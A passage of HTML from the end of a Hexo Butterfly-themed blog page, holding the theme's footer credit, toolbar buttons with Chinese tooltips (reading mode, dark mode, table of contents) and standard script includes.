href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>
